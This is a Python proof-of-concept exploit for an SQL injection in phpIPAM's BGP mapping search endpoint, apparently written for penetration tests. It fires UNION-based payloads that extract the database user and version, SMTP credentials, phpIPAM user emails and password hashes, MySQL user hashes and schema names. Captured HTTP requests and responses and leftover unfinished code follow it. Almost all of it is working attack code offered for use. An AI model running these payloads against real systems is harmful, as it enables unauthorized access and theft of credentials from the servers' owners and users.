#!/usr/bin/env python
# -*- coding: utf-8 -*-


# The vulnerability was discovered by Oscar Uribe (https://co.linkedin.com/in/oscar-uribe-londo%C3%B1o-0b6534155)
# https://fluidattacks.com/advisories/mercury/
# This is just a PoC to automate the execution of some easy payloads during the engagements/pentests



import requests
import sys
from bs4 import BeautifulSoup
from tabulate import tabulate
from termcolor import colored, cprint

# TODO: args
# TODO: login
# TODO: get csrftoken
# TODO: get bgp_id




def banner():
    print("""  ___  _  _  ____     ___   ___  ___   ___      ___   ___   ___    __    _  
 / __)( \/ )( ___)___(__ \ / _ \(__ \ (__ \ ___(__ \ (__ ) / _ \  /. |  / ) 
( (__  \  /  )__)(___)/ _/( (_) )/ _/  / _/(___)/ _/  (_ \( (_) )(_  _)/ _ \\
 \___)  \/  (____)   (____)\___/(____)(____)   (____)(___/ \___/   (_) \___/
""")
    print("                                     Vulnerability discovered by Oscar Uribe")
    print("                                                 PoC author: @javicarabantes")
    


def usage():
    print("Usage: exploit.py --url https://the.ipam.server:1234 --username my-admin-user")
    print("Note: user has to be admin and password will be asked\n")


def generate_headers(csrftoken, phpipam_session):
    return {
        "Host": "localhost:8888",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Length": "214",
        "Origin": "http://localhost:8888",
        "Connection": "close",
        "Referer": "http://localhost:8888/index.php?page=tools&section=routing&subnetId=bgp&sPage=1",
        "Cookie": f"csrftoken={csrftoken}; dojo-sidebar=max; phpipam={phpipam_session}; table-page-size=50",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }

def get_bgp_id():
    # TODO: check where this id came from in Burp
    return 12

simple_payloads = [

    {
        "name": "Basic Server Info",
        "description": "Extracting current user, current DB and Mysql/MariaDB version",
        "sqli": '" union select user(), NULL, database(), version()-- -',
        "tabulate_headers": ["user", "database", "version"]
    },
    {
        "name": "PHPIpam SMTP Settings",
        "description": "Getting SMTP settings if set",
        "sqli": '" union select concat(mserver, 0x3A, mport), NULL, muser, mpass from settingsMail-- -',
        "tabulate_headers": ["server:port", "smtp_user", "smtp_password"]
    },
    {
        "name": "PHPIpam Users",
        "description": "Getting Other PHPIPAM users format: email::username::password and additional information",
        "sqli": '" union select concat(email, 0x3A, 0x3A, username, 0x3A, 0x3A, password), NULL, if(authMethod=1, \'mysql_user\', \'basic_http_user\'), if(domainUser=1, \'Domain user\', \'local_db_user\') from users-- -',
        "tabulate_headers": ["email_username_password", "authMethod", "domainUser"]
    },
    {
        "name": "MysqlDB Users",
        "description": "Trying to extact users and hashed password from mysql.user tables if possible",
        "sqli": '" union select mysql.user.user, NULL, mysql.user.host, mysql.user.password from mysql.user-- -',
        "tabulate_headers": ["user", "host", "password"]
    },
    {
        "name": "Other schemas availables",
        "description": "Trying to extact other schemas the current user has access if possible",
        "sqli": '" union select group_concat(information_schema.schemata.schema_name), NULL, NULL, NULL from information_schema.schemata where information_schema.schemata.schema_name not in ("information_schema", "sys", "mysql", "performance_schema")-- -',
        "tabulate_headers": ["schema_list", "", ""]
    }
]

banner()



sqli_url = "http://localhost:8888/app/admin/routing/edit-bgp-mapping-search.php"
csrftoken = "tepnC0VoStC9AemDzokkBxz7K7SOC63kCX5wUXWFrVcaChxWLrdTdV0LlYMTojyf"
phpipam_session = "5qusqv8sq7s02h4cf0kvdsllts"

headers = generate_headers(csrftoken, phpipam_session)
bgp_id = get_bgp_id()
verbose = False

for obj in simple_payloads:
    cprint(f"\n[+] Name: {obj['name']} - {obj['description']}", "green")

    sqli = obj['sqli']

    payload = {
        "subnet": sqli,
        "bgp_id": bgp_id
    }

    response = requests.post(sqli_url, data=payload, headers=headers)
    if verbose: print(response.text)
    bs = BeautifulSoup(response.text, "lxml")


    response_tr = bs.find_all("tr")
    
    table = []

    if len(response_tr) == 0:
        alert = bs.find("div").get_text()
        print(colored(f"[-] {alert}", "red"))

    # if we got more than one result, we have to loop for tr first
    for tr in response_tr:
        response_td = tr.find_all("td")
        #print(len(response_td))

        # We got results
        if len(response_td) > 0:
            
            # as we use tabulate to pretty print the results
            # we want to create 3 columns but the hash of phpipam users might give some problems. We need to split the response and format each column
            output = response_td[2].get_text()
            output = output.strip()
            
            # last column
            space_splitting = output.split(" ")
            col2 = space_splitting[1].replace("(", "").replace(")", "")
            
            # middle column
            slash_chunk = space_splitting[0]
            aux = slash_chunk.split("/")
            col1 = aux[len(aux) - 1]
                
            
            # removing the last part (which is part of the col1) and join with / which may be part of the hash
            aux.pop()
            col0 = "/".join(aux)
            
            row = [ col0, col1, col2]
            table.append(row)

            


    print(tabulate(table, headers=obj['tabulate_headers']))
    #table = []


sys.exit(0)


"""
in case of error:
<div class='alert alert-danger'>SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'phpipam'@'192.168.16.4' for table 'user'</div>
"""
# " union select mysql.user.user, NULL, mysql.user.host, mysql.user.password from mysql.user-- -

# fetch al schemadata where this user can access
# " union select group_concat(information_schema.schemata.schema_name), NULL, NULL, NULL from information_schema.schemata where information_schema.schemata.schema_name not in ("information_schema", "sys", "mysql", "performance_schema")-- -


csrftoken = fetch_csrf_token()
# CSRF TOKEN EXTRACTION
"""
"""



phpipam_session = login(ipamusernae, ipampassword, csrftoken)
# Login process
"""
POST /app/login/login_check.php HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 60
Origin: http://localhost:8888
Connection: close
Referer: http://localhost:8888/index.php?page=login
Cookie: csrftoken=tepnC0VoStC9AemDzokkBxz7K7SOC63kCX5wUXWFrVcaChxWLrdTdV0LlYMTojyf; dojo-sidebar=max; phpipamredirect=%2F; phpipam=epa6jhun43lq30h4afqcqhip69
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

ipamusername=admin&ipampassword=mypassword&phpipamredirect=%2F
"""

simple_payloads = [
    {
        "basic_server_info": '" union select user(), NULL, database(), version()-- -'
    },
    {
        "phpipam_smtp_data": '" union select concat(mserver, 0x3A, mport), NULL, muser, mpass from settingsMail-- -'
    },
    {
        "phpipam_users": '" union select concat(email, 0x3A, 0x3A, username, 0x3A, 0x3A, password), NULL, if(authMethod=1, \'mysql_user\', \'basic_http_user\'), if(domainUser=1, \'Domain user\', \'Local db user\') from users-- -'
    }    
]



for payload in payloads:
    pass

# SQLi PoC
"""
POST /app/admin/routing/edit-bgp-mapping-search.php HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 44
Origin: http://localhost:8888
Connection: close
Referer: http://localhost:8888/index.php?page=tools&section=routing&subnetId=bgp&sPage=1
Cookie: csrftoken=tepnC0VoStC9AemDzokkBxz7K7SOC63kCX5wUXWFrVcaChxWLrdTdV0LlYMTojyf; dojo-sidebar=max; phpipam=4b24dikv2iq8laolrmreuk7s3o; table-page-size=50
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

subnet="+union+select+1,2,3,'A'--+-&bgp_id=1
"""
# Response of the SQLiPoC
"""
HTTP/1.1 200 OK
Date: Sat, 22 Jan 2022 10:50:55 GMT
Server: Apache
X-Powered-By: PHP/7.4.25
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Set-Cookie: phpipam=4b24dikv2iq8laolrmreuk7s3o; expires=Sun, 23 Jan 2022 10:50:55 +0000; Max-Age=86400; path=/; SameSite=Lax; HttpOnly;
Vary: Accept-Encoding
Content-Length: 436
Connection: close
Content-Type: text/html; charset=UTF-8

<table class='table table-condensed table-auto'><tr><td><btn class='btn btn-xs btn-success add_bgp_mapping' data-subnetId='2' data-bgp_id='1' data-curr_id='0'><i class='fa fa-plus'></i></btn></td><td><select name='select-0' class='select-0 form-control input-w-auto input-sm'>	<option value='advertised'>Advertised</option>	<option value='received'>Received</option></select></td><td> 1/3 (A)</td><td class='result-0'></td></tr></table>
"""

